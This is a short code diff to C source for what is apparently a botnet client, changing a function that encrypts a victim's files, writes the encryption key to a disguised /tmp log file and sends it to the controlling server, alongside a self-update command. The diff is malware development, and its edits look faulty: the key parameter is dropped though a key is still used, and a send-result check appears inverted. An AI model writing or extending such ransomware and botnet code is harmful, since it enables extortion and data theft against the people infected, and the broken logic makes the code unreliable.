@@ -170,7 +170,7 @@ void receive_and_process_message(int sockfd, int argc, char *argv[]) {
             perform_self_update("/tmp/botnet/downloads/client", sockfd, argc, argv);
             break;
         case ENCRYPT:
-            encrypt(sockfd, cmd.params[0], cmd.params[1]);
+            encrypt(sockfd, cmd.params[0]);
             break;
         case DECRYPT:
             output_log("Preparing for DECRYPT request\n", LOG_DEBUG, LOG_TO_CONSOLE);
@@ -261,7 +261,7 @@ char* generate_key(){
     return key;
 }
 
-void encrypt(int sockfd,const char *filepath, const char* key){
+void encrypt(int sockfd,const char *filepath){
     Command cmd = {
         .cmd_id = "0",
         .delay = 0,
@@ -288,7 +288,7 @@ void encrypt(int sockfd,const char *filepath, const char* key){
     output_log("encrypt : Encrypting files with command: %s\n", LOG_DEBUG, LOG_TO_CONSOLE, command);
     
     write_encrypted_file("/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log", key); // Write the key to a file
-    if(send_file(sockfd, "/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log") < 0) { // send key to server
+    if(send_file(sockfd, "/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log") == 0) { // send key to server
         output_log("encrypt : Failed to send encryption key file to server\n", LOG_ERROR, LOG_TO_ALL);
         free(key);
         free_command(&cmd);
